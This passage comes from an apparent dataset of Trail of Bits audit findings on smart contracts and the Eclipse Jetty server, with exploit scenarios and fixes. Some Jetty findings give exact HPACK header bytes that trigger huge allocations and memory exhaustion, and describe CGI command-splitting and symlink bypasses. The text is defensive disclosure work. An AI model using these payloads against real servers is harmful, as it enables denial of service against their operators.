contracts that will be called and the expected behavior in the event of a revert are currently unknown. If a revert should not cause the entire transaction to revert, the current implementation does not fulll that requirement. To accommodate both casesa revert of an external call reverts the entire transaction or allows the transaction to continue a middle road can be taken. For each contract in the list, a boolean could indicate whether the transaction should revert or continue if the external call fails. If the boolean indicates that the transaction should continue, an emitted event would indicate the contract address and the input arguments of the callback that reverted. This would allow the system to continue functioning while admins investigate the cause of the revert and x the issue(s) if needed. Exploit Scenario Alice, the owner of the SherlockClaimManager contract, registers contract A in the list of contracts on which PreCorePayoutCallback is called. Contract A contains a bug that causes the callback to revert every time. Bob, a protocol agent, successfully les a claim and calls payoutClaim. The transaction reverts because the call to contract A reverts. Recommendations Short term, review the requirements of contracts that will be called by callback functions, and adjust the implementation to fulll those requirements. Long term, when designing a system reliant on external components that have not yet been determined, carefully consider whether to include those integrations during the development process or to wait until those components have been identied. This will prevent unforeseen problems due to incomplete or incorrect integrations with unknown contracts.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "9. pullReward could silently fail and cause stakers to lose all earned SHER rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "If the SherDistributionManager.pullReward function reverts, the calling function (_stake) will not set the SHER rewards in the stakers position NFT. As a result, the staker will not receive the payout of SHER rewards after the stake period has passed. // Sets the timestamp at which this position can first be unstaked/restaked lockupEnd_[_id] = block.timestamp + _period; if (address(sherDistributionManager) == address(0)) return 0; // Does not allow restaking of 0 tokens if (_amount == 0) return 0; // Checks this amount of SHER tokens in this contract before we transfer new ones uint256 before = sher.balanceOf(address(this)); // pullReward() calcs then actually transfers the SHER tokens to this contract try sherDistributionManager.pullReward(_amount, _period, _id, _receiver) returns ( function _stake( uint256 _amount, uint256 _period, uint256 _id, address _receiver 354 355 356 357 358 359 ) internal returns (uint256 _sher) { 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 } catch (bytes memory reason) { _sher = amount; uint256 amount ) { } // If for whatever reason the sherDistributionManager call fails emit SherRewardsError(reason); return 0; // actualAmount should represent the amount of SHER tokens transferred to this contract for the current stake position 382 383 384 385 386 } uint256 actualAmount = sher.balanceOf(address(this)) - before; if (actualAmount != _sher) revert InvalidSherAmount(_sher, actualAmount); // Assigns the newly created SHER tokens to the current stake position sherRewards_[_id] = _sher; Figure 9.1: contracts/Sherlock.sol:354-386 When the pullReward call reverts, the SherRewardsError event is emitted. The staker could check this event and see that no SHER rewards were set. The staker could also call the sherRewards function and provide the positions NFT ID to check whether the SHER rewards were set. However, stakers should not be expected to make these checks after every (re)stake. There are two ways in which the pullReward function can fail. First, a bug in the arithmetic could cause an overow and revert the function. Second, if the SherDistributionManager contract does not hold enough SHER to be able to transfer the calculated amount, the pullReward function will fail. The SHER balance of the contract needs to be manually topped up. If a staker detects that no SHER was set for her (re)stake, she may want to cancel the stake. However, stakers are not able to cancel a stake until the stakes period has passed (currently, at least three months). Exploit Scenario Alice creates a new stake, but the SherDistributionManager contract does not hold enough SHER to transfer the rewards, and the transaction reverts. The execution continues and sets Alices stake allocation to zero. Recommendations Short term, have the system revert transactions if pullReward reverts. Long term, have the system revert transactions if part of the expected rewards are not allocated due to an internal revert. This will prevent situations in which certain users get rewards while others do not.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "1. Trusted forwarder can take over the WalletFactory contract ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf", "body": "The WalletFactory contract implements ERC-2771, which enables the use of a trusted forwarder to create wallets on behalf of other accounts. With the introduction of PR #110, the contract is also upgradeable. Therefore, the trusted forwarder contract can call the upgrade function on the WalletFactory contract by submitting the owner address as the value of msg.sender. PR #110 adds an override of the _msgSender function to the WalletFactory contract, which now uses the ERC-2771 context contract; this function allows the trusted forwarder to set any value for the message sender: /// @dev Provides information about the current execution context /// /// function _msgSender() WalletFactory is inheriting from ERC2771Context and Context through Ownable2Step. It is needed to override to specify which base to use internal view virtual override(ERC2771Context, Context) returns (address) return ERC2771Context._msgSender(); { } Figure 1.1: WalletFactory.sol#L306-L317 The onlyOwner modier relies on _msgSender: /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() { _checkOwner(); _; } [] /** * @dev Throws if the sender is not the owner. */ function _checkOwner() internal view virtual { require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); } Figure 1.2: OZ/access/Ownable.sol#L42-L64 Among others, onlyOwner is used as an access control of the upgrade function: function _authorizeUpgrade(address newImplementation) internal virtual override onlyOwner { if (newImplementation.code.length == 0) { revert AddressNotContract(newImplementation); } } Figure 1.3: OZ/access/Ownable.sol#L50-L52 As a result, the trusted forwarder can control all of the owner-specic operations, including the following:  Upgrading the contract  Changing the contracts owner Appendix B contains a test case to trigger this issue. Exploit Scenario Bob is a trusted forwarder. Therefore, he expects that his account has only additional rights regarding the creation of new wallets, so he does not properly protect his access. Eve manages to compromise Bobs account and gains access to ownership of the wallet factory. Eve uses her new access to upgrade the wallet factory to a malicious contract that generates malicious wallets. Alice unknowingly generates a new malicious wallet and puts $10 million worth of assets into it. Eve steals the assets. Recommendations Short term, prevent the trusted forwarder from having access to owner privileges except where this behavior is expected and documented. Long term, document and test the access controls of the wallet factory; ensure that the documentation highlights the access control expectations for the trusted forwarder.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Lack of contract existence check on StaticHyVM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf", "body": "The call to delegatecall made in the StaticHyVM contract does not check that the hyvm contract has code; this call will succeed even if the hyvm contract was destroyed. The doDelegateCall function uses a low-level call to delegatecall to call hyvm: function doDelegateCall(bytes calldata payload) public returns (bytes memory) { if (msg.sender != address(this)) revert OnlySelf(); (bool success, bytes memory data) = hyvm.delegatecall(payload); if (!success) _bubbleError(data, \"StaticHyVM: delegatecall failed\"); return data; } Figure 2.1: StaticHyVM/StaticHyVM.sol#L30-L36 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 2.2: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall As a result, any call made to a nonexistent contract will return success, even if no code was executed. We acknowledge that the likelihood that the hyvm contract will be destroyed is low; however, the previous audit that we conducted on the Nested Finance codebases determined that this risk is not null. (Refer to nding TOB-NESTED-1 of the previous report.) Exploit Scenario Bob creates a bot that takes actions following the execution of StaticHyVM. A bug is found in hyvm, and the contract is destroyed. However, all of the calls made to StaticHyVM continue to return success, leading Bobs bot to take incorrect actions. Recommendations Short term, implement a contract existence check before the call to delegatecall in StaticHyVM. Long term, carefully review the Solidity documentation, especially the Warnings section. Document every assumption made for code optimizations, and ensure that the underlying invariants hold. For example, if an invariant states that all of the contracts that are used exist, extra care must be taken to ensure that all calls destinations always have code.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Address aliasing on optimistic rollups is not considered ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf", "body": "The documentation states that the users wallet address will be the same across dierent chains, but this does not take into account the address aliasing that some chains apply to sender addresses. PR #119 changes the logic of the wallet creation process such that a wallet originating from a specic user will be the same across EVM-compatible chains: Allows to share the same address on dierent EVM equivalent chains. It should prevent cross chain manipulation. If a USER1 creates a wallet or USER2 creates on behalf of USER1, the address of the wallet will be the same and will depend on the USER1 address. Hence, on dierent chains, if EVM equivalent, the address of a wallet for a specic user will be the same. Figure 3.1: Documentation included with PR #119 However, some chainsparticularly optimistic rollupsapply aliasing on the L1 callers address if it is a contract. (Refer to Arbitrums documentation.) In these situations, the address specied for the L2 caller will not be the same as the L1 address. As a result, the assumption that users can keep the same address across chains will not hold for such chains. Recommendations Short term, update the documentation to inform users that their wallet addresses may be aliased on some chains. Long term, create tests targeting every EVM-compatible chain that the system is meant to support. References  Address aliasing in Arbitrum  Address aliasing in Optimism", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "4. Undocumented expectations for state-changing operations in HyVM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf", "body": "PR #1 removed some of the state-changing operations from the HyVM contract, but not all of them. It is unclear whether the Nested Finance team intended to keep those remaining operations in the contract. In particular, the following state-changing operations are still allowed:  Operations that emit events (such as log0 and log1)  Operations that are called with nonzero values Recommendations Short term, update the documentation to make it clear whether these operations should be allowed. Disable any that should not be allowed. Long term, maintain an up-to-date design specication to dene the behavior of the HyVM, including the operations that are available and the state changes that are allowed, if any. This specication should be a living document that changes as the protocol changes.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Invalid EVM versions possible in multi-chain deployment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf", "body": "The HyVM and Tetris contracts contain Solidity pragmas that constrain the compilers version to 0.8.16 or above. However, if these contracts were to be compiled with Solidity 0.8.20 and deployed to a chain that has not implemented EIP-3855, the contracts would fail to deploy because Solidity 0.8.20 would default to the Shanghai EVM version. The Shanghai hard fork introduced a new opcode, PUSH0. Solidity 0.8.20 adds support for Shanghai, and contracts compiled with Solidity 0.8.20 will include PUSH0 instructions by default. Given that most non-Ethereum chains have not added support for PUSH0 yet, contracts compiled with Solidity 0.8.20 will fail to deploy on those chains unless the EVM version is explicitly set. Recommendations Short term, add documentation to ensure that the code is built with an EVM version that is supported by the target chain. Long term, add tests that cover all of the EVM-compatible chains that should be supported by the contracts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. executeCall will always revert when sending native tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf", "body": "executeCall and executeMultiCall are both payable functions that accept a Call struct as an argument. These functions use OpenZeppelin's Address.functionCallWithValue function to make an arbitrary call to the target address, with payload passed as the calldata and the value to be sent equal to call.value. function executeCall(Call calldata call) public payable override onlyWalletOwner returns (bytes memory data) { } _wrapNativeToken(); return Address.functionCallWithValue(call.target, call.payload, call.value); Figure 6.1: NestedWallet.sol#L141-L150 In both functions, before Address.functionCallWithValue is invoked, the _wrapNativeToken function is called, which deposits msg.value worth of native tokens into the WETH contract, turning any ETH that was sent with the transaction into WETH. Therefore, by the time the call to Address.functionCallWithValue is made, the wallet no longer has the native tokens that were sent along with the call. So when Address.functionCallWithValue performs its low-level call, the transaction reverts with the error Address: insufficient balance for call. Exploit Scenario Bob calls executeCall to send 10 ether. The call fails, and Bob is unable to use the Nested wallet as he expected to. Recommendations Short term, remove the _wrapNativeToken(); line from both functions. Additionally, we noted that _wrapNativeToken is called in executeHyVMCall and executeSignature712, but it does not introduce a risk because it is called before a delegatecall and the value is not passed along in the same way. However, if this is the desired behavior, then it should be documented. Long term, include unit and fuzz tests for sending native tokens when testing payable functions. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. Risk of integer overow that could allow HpackDecoder to exceed maxHeaderSize ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "An integer overow could occur in the MetaDataBuilder.checkSize function, which would allow HPACK header values to exceed their size limit. MetaDataBuilder.checkSize determines whether a header name or value exceeds the size limit and throws an exception if the limit is exceeded: public void checkSize ( int length, boolean huffman) throws SessionException { 291 292 293 294 295 296 297 _size + length, _maxSize); 298 } // Apply a huffman fudge factor if (huffman) length = (length * 4 ) / 3 ; if ((_size + length) > _maxSize) throw new HpackException.SessionException( \"Header too large %d > %d\" , Figure 1.1: MetaDataBuilder.checkSize However, when the value of length is very large and huffman is true , the multiplication of length by 4 in line 295 will overow, and length will become negative. This will cause the result of the sum of _size and length to be negative, and the check on line 296 will not be triggered. Exploit Scenario An attacker repeatedly sends HTTP messages with the HPACK header 0x00ffffffffff02 . Each time this header is decoded, the following occurs:  HpackDecode.decode determines that a Human-coded value of length 805306494 needs to be decoded. 36 OSTIF Eclipse: Jetty Security Assessment  MetaDataBuilder.checkSize approves this length.  Huffman.decode allocates a 1.6 GB string array.  Huffman.decode experiences a buer overow error, and the array is deallocated the next time garbage collection happens. (Note that this deallocation can be delayed by appending valid Human-coded characters to the end of the header.) Depending on the timing of garbage collection, the number of threads, and the amount of memory available on the server, this may cause the server to run out of memory. Recommendations Short term, have MetaDataBuilder.checkSize check that length is below a threshold before performing the multiplication. Long term, use fuzzing to check for similar errors; we found this issue by fuzzing HpackDecode . 37 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Cookie parser accepts unmatched quotation marks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The RFC6265CookieParser.parseField function does not check for unmatched quotation marks. For example, parseField(\\) will execute without raising an exception. This issue is unlikely to lead to any vulnerabilities, but it could lead to problems if users or developers expect the function to accept only valid strings. Recommendations Short term, modify the function to check that the state at the end of the given string is not IN_QUOTED_VALUE . Long term, when using a state machine, ensure that the code always checks that the state is valid before exiting. 38 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Errant command quoting in CGI servlet ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "If a user sends a request to a CGI servlet for a binary with a space in its name, the servlet will escape the command by wrapping it in quotation marks. This wrapped command, plus an optional command prex, will then be executed through a call to Runtime.exec . If the original binary name provided by the user contains a quotation mark followed by a space, the resulting command line will contain multiple tokens instead of one. For example, if a request references a binary called file name here , the escaping algorithm will generate the command line string file name here , which will invoke the binary named file , not the one that the user requested. if (execCmd.length() > 0 && execCmd.charAt( 0 ) != '\"' && execCmd.contains( \" \" )) execCmd = \"\\\"\" + execCmd + \"\\\"\" ; Figure 3.1: CGI.java#L337L338 Exploit Scenario The cgi-bin directory contains a binary named exec and a subdirectory named exec commands , which contains a le called bin1 . A user sends to the CGI servlet a request for the lename exec commands/bin1 . This request passes the le existence check on lines 194 through 205 in CGI.java . The servlet adds quotation marks around this lename, resulting in the command line string exec commands/bin1 . When this string is passed to Runtime.exec , instead of executing the bin1 binary, the server executes the exec binary with the argument commands/bin1 . This behavior is incorrect and could bypass alias checks; it could also cause other unintended behaviors if a command prex is congured. Additionally, if the useFullPath conguration setting is o, the command would not need to pass the existence check. Without this setting, an attacker exploiting this issue would not have to rely on a binary and subdirectory with similar names, and the attack could succeed on a much wider variety of directory structures. 39 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, update line 346 in CGI.java to replace the call to exec(String command, String[] env, File dir) with a call to exec(String[] cmdarray, String[] env, File dir) so that the quotation mark escaping algorithm does not create new tokens in the command line string. Long term, update the quotation mark escaping algorithm so that any unescaped quotation marks in the original name of the command are properly escaped, resulting in one double-quoted token instead of multiple adjacent quoted strings. Additionally, the expression execCmd.charAt(0) != '\"' on line 337 of CGI.java is intended to avoid adding additional quotation marks to an already-quoted command string. If this check is unnecessary, it should be removed. If it is necessary, it should be replaced by a more robust check that accurately detects properly formatted double-quoted strings. 40 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Symlink-allowed alias checker ignores protected targets list ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The class SymlinkAllowedResourceAliasChecker is an alias checker that permits users to access a symlink as long as the symlink is stored within an allowed directory. The following comment appears on line 76 of this class: // TODO: return !getContextHandler().isProtectedTarget(realURI.toString()); Figure 4.1: SymlinkAllowedResourceAliasChecker.java#L76 As this comment suggests, the alias checker does not yet enforce the context handlers protected resource list. That is, if a symlink is contained in an allowed directory but points to a target on the protected resource list, the alias checker will return a positive match. During our review, we found that some other modules, but not all, independently enforce the protected resource list and will decline to serve resources on the list even if the alias checker returns a positive result. But the modules that do not independently enforce the protected resource list could serve protected resources to attackers conducting symlink attacks. Exploit Scenario An attacker induces the creation of a symlink (or a system administrator accidentally creates one) in a web-accessible directory that points to a protected resource (e.g., a child of WEB-INF ). By requesting this symlink through a servlet that uses the SymlinkAllowedResourceAliasChecker class, the attacker bypasses the protected resource list and accesses the sensitive les. Recommendations Short term, implement the check referenced in the comment so that the alias checker rejects symlinks that point to a protected resource or a child of a protected resource. Long term, consider clarifying and documenting the responsibilities of dierent components for enforcing protected resource lists. Consider implementing redundant checks in multiple modules for purposes of layered security. 41 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "5. Missing check for malformed Unicode escape sequences in QuotedStringTokenizer.unquote ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The QuotedStringTokenizer classs unquote method parses \\u#### Unicode escape sequences, but it does not rst check that the escape sequence is properly formatted or that the string is of a sucient length: case 'u' : b.append(( char )( (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 24 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 16 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 8 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++))) ) ); break ; Figure 5.1: QuotedStringTokenizer.java#L547L555 Any calls to this function with an argument ending in an incomplete Unicode escape sequence, such as str\\u0 , will cause the code to throw a java.lang.NumberFormatException exception. The only known execution path that will cause this method to be called with a parameter ending in an invalid Unicode escape sequence is to induce the processing of an ETag Matches header by the ResourceService class, which calls EtagUtils.matches , which calls QuotedStringTokenizer.unquote . Exploit Scenario An attacker introduces a maliciously crafted ETag into a browsers cache. Each subsequent request for the aected resource causes a server-side exception, preventing the server from producing a valid response so long as the cached ETag remains in place. Recommendations Short term, add a try-catch block around the aected code that drops malformed escape sequences. 42 OSTIF Eclipse: Jetty Security Assessment Long term, implement a suitable workaround for lenient mode that passes the raw bytes of the malformed escape sequence into the output. 43 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. WebSocket frame length represented with 32-bit integer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The WebSocket standard (RFC 6455) allows for frames with a size of up to 2 64 bytes. However, the WebSocket parser represents the frame length with a 32-bit integer: private int payloadLength; // ...[snip]... case PAYLOAD_LEN_BYTES: { } byte b = buffer.get(); --cursor; payloadLength |= (b & 0xFF ) << ( 8 * cursor); // ...[snip]... Figure 6.1: Parser.java , lines 57 and 147151 As a result, this parsing algorithm will incorrectly parse some length elds as negative integers, causing a java.lang.IllegalArgumentException exception to be thrown when the parser tries to set the limit of a Buffer object to a negative number (refer to TOB-JETTY-7 ). Consequently, Jettys WebSocket implementation cannot properly process frames with certain lengths that are compliant with RFC 6455. Even if no exception results, this logic error will cause the parser to incorrectly identify the sizes of WebSocket frames and the boundaries between them. If the server passes these frames to another WebSocket connection, this bug could enable attacks similar to HTTP request smuggling, resulting in bypasses of security controls. Exploit Scenario A Jetty WebSocket server is deployed in a reverse proxy conguration in which both Jetty and another web server parse the same stream of WebSocket frames. An attacker sends a frame with a length that the Jetty parser incorrectly truncates to a 32-bit integer. Jetty and the other server interpret the frames dierently, which causes errors in the implementation of security controls, such as WAF lters. 44 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, change the payloadLength variable to use the long data type instead of an int . Long term, audit all arithmetic operations performed on this payloadLength variable to ensure that it is always used as an unsigned integer instead of a signed one. The standard librarys Integer class can provide this functionality. 45 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "7. WebSocket parser does not check for negative payload lengths ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The WebSocket parsers checkFrameSize method checks for payload lengths that exceed the current congurations maximum, but it does not check for payload lengths that are lower than zero. If the payload length is lower than zero, the code will throw an exception when the payload length is passed to a call to buffer.limit . Exploit Scenario An attacker sends a WebSocket payload with a length eld that parses to a negative signed integer (refer to TOB-JETTY-6 ). This payload causes an exception to be thrown and possibly the server process to crash. Recommendations Short term, update checkFrameSize to throw an org.eclipse.jetty.websocket.core.exception.ProtocolException exception if the frames length eld is less than zero. 46 OSTIF Eclipse: Jetty Security Assessment 8. WebSocket parser greedily allocates ByteBu\u0000ers for large frames Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-JETTY-8 Target: org.eclipse.jetty.websocket.core.internal.Parser", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Risk of integer overow in HPACK's NBitInteger.decode ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The static function NBitInteger.decode is used to decode bytestrings in HPACK's integer format. It should return only positive integers since HPACKs integer format is not intended to support negative numbers. However, the following loop in NBitInteger.decode is susceptible to integer overows in its multiplication and addition operations: public static int decode (ByteBuffer buffer, int n) { if (n == 8 ) { // ... } int nbits = 0xFF >>> ( 8 - n); int i = buffer.get(buffer.position() - 1 ) & nbits; if (i == nbits) { int m = 1 ; int b; do { b = 0xff & buffer.get(); i = i + (b & 127 ) * m; m = m * 128 ; } while ((b & 128 ) == 128 ); } return i; } Figure 9.1: NBitInteger.java , lines 105145 For example, NBitInteger.decode(0xFF8080FFFF0F, 7) returns -16257 . Any overow that occurs in the function would not be a problem on its own since, in general, the output of this function ought to be validated before it is used; however, when coupled with other issues (refer to TOB-JETTY-10 ), an overow can cause vulnerabilities. 49 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, modify NBitInteger.decode to check that its result is nonnegative before returning it. Long term, consider merging the QPACK and HPACK implementations for NBitInteger , since they perform the same functionality; the QPACK implementation of NBitInteger checks for overows. 50 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. MetaDataBuilder.checkSize accepts headers of negative lengths ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The MetaDataBuilder.checkSize function accepts user-entered HPACK header values of negative sizes, which could cause a very large buer to be allocated later when the user-entered size is multiplied by 2. MetaDataBuilder.checkSize determines whether a header name or value exceeds the size limit and throws an exception if the limit is exceeded: public void checkSize ( int length, boolean huffman) throws SessionException { // Apply a huffman fudge factor if (huffman) length = (length * 4 ) / 3 ; if ((_size + length) > _maxSize) throw new HpackException.SessionException( \"Header too large %d > %d\" , _size + length, _maxSize); } Figure 10.1: MetaDataBuilder.java , lines 291298 However, it does not throw an exception if the size is negative. Later, the Huffman.decode function multiplies the user-entered length by 2 before allocating a buer: public static String decode (ByteBuffer buffer, int length) throws HpackException.CompressionException { Utf8StringBuilder utf8 = new Utf8StringBuilder(length * 2 ); // ... Figure 10.2: Huffman.java , lines 357359 This means that if a user provides a negative length value (or, more precisely, a length value that becomes negative when multiplied by the 4/3 fudge factor), and this length value becomes a very large positive number when multiplied by 2, then the user can cause a very large buer to be allocated on the server. 51 OSTIF Eclipse: Jetty Security Assessment Exploit Scenario An attacker repeatedly sends HTTP messages with the HPACK header 0x00ff8080ffff0b . Each time this header is decoded, the following occurs:  HpackDecode.decode determines that a Human-coded value of length -1073758081 needs to be decoded.  MetaDataBuilder.checkSize approves this length.  The number is multiplied by 2, resulting in 2147451134 , and Huffman.decode allocates a 2.1 GB string array.  Huffman.decode experiences a buer overow error, and the array is deallocated the next time garbage collection happens. (Note that this deallocation can be delayed by adding valid Human-coded characters to the end of the header.) Depending on the timing of garbage collection, the number of threads, and the amount of memory available on the server, this may cause the server to run out of memory. Recommendations Short term, have MetaDataBuilder.checkSize check that the given length is positive directly before adding it to _size and comparing it with _maxSize . Long term, add checks for integer overows in Huffman.decode and in NBitInteger.decode (refer to TOB-JETTY-9 ) for added redundancy. 52 OSTIF Eclipse: Jetty Security Assessment 11. Insu\u0000cient space allocated when encoding QPACK instructions and entries Severity: Low Diculty: High Type: Denial of Service Finding ID: TOB-JETTY-11 Target:  org.eclipse.jetty.http3.qpack.internal.instruction.IndexedName EntryInstruction  org.eclipse.jetty.http3.qpack.internal.instruction.LiteralName EntryInstruction  org.eclipse.jetty.http3.qpack.internal.instruction.EncodableEn try", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "12. LiteralNameEntryInstruction incorrectly encodes value length ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "QPACK instructions for inserting entries with literal names and non-Human-coded values will be encoded incorrectly when the values length is over 30, which could cause values to be sent incorrectly or errors to occur during decoding. The following snippet of the LiteralNameEntryInstruction.encode function is responsible for encoding the header value: if (_huffmanValue) byteBuffer.put(( byte )( 0x80 )); NBitIntegerEncoder.encode(byteBuffer, 7 , HuffmanEncoder.octetsNeeded(_value)); HuffmanEncoder.encode(byteBuffer, _value); 78 79 { 80 81 82 83 } 84 85 { 86 87 88 89 } else byteBuffer.put(( byte )( 0x00 )); NBitIntegerEncoder.encode(byteBuffer, 5 , _value.length()); byteBuffer.put(_value.getBytes()); Figure 12.1: LiteralNameEntryInstruction.java , lines 7889 On line 87, 5 is the second parameter to NBitIntegerEncoder.encode , indicating that the number will take up 5 bits in the rst encoded byte; however, the second parameter should be 7 instead. This means that when _value.length() is over 30, it will be incorrectly encoded. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. 56 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, change the second parameter of the NBitIntegerEncoder.encode function from 5 to 7 in order to reect that the number will take up 7 bits. Long term, write more tests to catch similar encoding/decoding problems. 57 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "13. FileInitializer does not check for symlinks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Module conguration les can direct Jetty to download a remote le and save it in the local lesystem while initializing the module. During this process, the FileInitializer class validates the destination path and throws an IOException exception if the destination is outside the ${jetty.base} directory. However, this validation routine does not check for symlinks: // now on copy/download paths (be safe above all else) if (destination != null && !destination.startsWith(_basehome.getBasePath())) throw new IOException( \"For security reasons, Jetty start is unable to process file resource not in ${jetty.base} - \" + location); Figure 13.1: FileInitializer.java , lines 112114 None of the subclasses of FileInitializer check for symlinks either. Thus, if the ${jetty.base} directory contains a symlink, a le path in a modules .ini le beginning with the symlink name will pass the validation check, and the le will be written to a subdirectory of the symlinks destination. Exploit Scenario A systems ${jetty.base} directory contains a symlink called dir , which points to /etc . The system administrator enables a Jetty module whose .ini le contains a [files] entry that downloads a remote le and writes it to the relative path dir/config.conf . The lesystem follows the symlink and writes a new conguration le to /etc/config.conf , which impacts the servers system conguration. Additionally, since the FileInitializer class uses the REPLACE_EXISTING ag, this behavior overwrites an existing system conguration le. Recommendations Short term, rewrite all path checks in FileInitializer and its subclasses to include a call to the Path.toRealPath function, which, by default, will resolve symlinks and produce the real lesystem path pointed to by the Path object. If this real path is outside ${jetty.base} , the le write operation should fail. 58 OSTIF Eclipse: Jetty Security Assessment Long term, consolidate all lesystem operations involving the ${jetty.base} or ${jetty.home} directories into a single centralized class that automatically performs symlink resolution and rejects operations that attempt to read from or write to an unauthorized directory. This class should catch and handle the IOException exception that is thrown in the event of a link loop or a large number of nested symlinks. 59 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "14. FileInitializer permits downloading les via plaintext HTTP ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Module conguration les can direct Jetty to download a remote le and save it in the local lesystem while initializing the module. If the specied URL is a plaintext HTTP URL, Jetty does not raise an error or warn the user. Transmitting les over plaintext HTTP is intrinsically unsecure and exposes sensitive data to tampering and eavesdropping in transit. Exploit Scenario A system administrator enables a Jetty module that downloads a remote le over plaintext HTTP during initialization. An attacker with a network intermediary position snis the trac and infers sensitive information about the design and conguration of the Jetty system under conguration. Alternatively, the attacker actively tampers with the le during transmission from the remote server to the Jetty installation, which enables the attacker to alter the modules behavior and launch other attacks against the targeted system. Recommendations Short term, add a check to the FileInitializer class and its subclasses to prohibit downloads over plaintext HTTP. Additionally, add a validation check to the module .ini le parser to reject any conguration that includes a plaintext HTTP URL in the [files] section. Long term, consolidate all remote le downloads conducted during module conguration operations into a single centralized class that automatically rejects plaintext HTTP URLs. If current use cases require support of plaintext HTTP URLs, then at a minimum, have Jetty display a prominent warning message and prompt the user for manual conrmation before performing the unencrypted download. 60 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "15. NullPointerException thrown by FastCGI parser on invalid frame type ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Because of a missing null check, the Jetty FastCGI clients Parser class throws a NullPointerException exception when parsing a frame with an invalid frame type eld. This exception occurs because the findContentParser function returns null when it does not have a ContentParser object matching the specied frame type, and the caller never checks the findContentParser return value for null before dereferencing it. case CONTENT: { ContentParser contentParser = findContentParser(headerParser.getFrameType()); 